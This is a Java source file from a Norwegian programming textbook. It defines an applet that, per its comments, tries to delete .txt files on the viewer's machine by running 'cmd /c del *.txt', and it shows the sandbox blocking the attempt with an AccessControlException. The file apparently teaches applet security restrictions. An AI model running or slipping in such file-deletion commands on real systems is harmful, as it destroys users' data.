/**
 * Suspekt.java - "Programmering i Java", 4.utgave - 2009-07-01
 *
 * Applet som prøver å skade slette filer på maskinen
 * der nettleseren kjører.
 *
 * Filen inneholder to klasser:
 * Suspekt: Selve appleten
 * Tegning: Tegneflaten til appleten
 */
import javax.swing.*;
import java.awt.*;

public class Suspekt extends JApplet {
  public void init() {
    add(new Tegning());
    try {
      System.out.println("Skal slette filer.");
      Runtime.getRuntime().exec("cmd /c del *.txt");
      /* Kommer hit hvis exec() var vellykket. */
      System.out.println("Nå er filene slettet!");
    } catch (Exception e) {
      /* Kommer hit hvis exec() ikke var vellykket. */
      System.out.println("Unntaksobjekt kastet: " + e.toString());
    }
  }
}

class Tegning extends JPanel {
    public void paintComponent(Graphics tegneflate) {
      super.paintComponent(tegneflate);
      tegneflate.drawString(
        "Dette er en suspekt applet, se etter meldinger i Java console.", 5, 50);
  }
}

/* Typisk utskrift i Java console:
Skal slette filer.
Unntaksobjekt kastet: java.security.AccessControlException:
access denied (java.io.FilePermission <<ALL FILES>> execute)
*/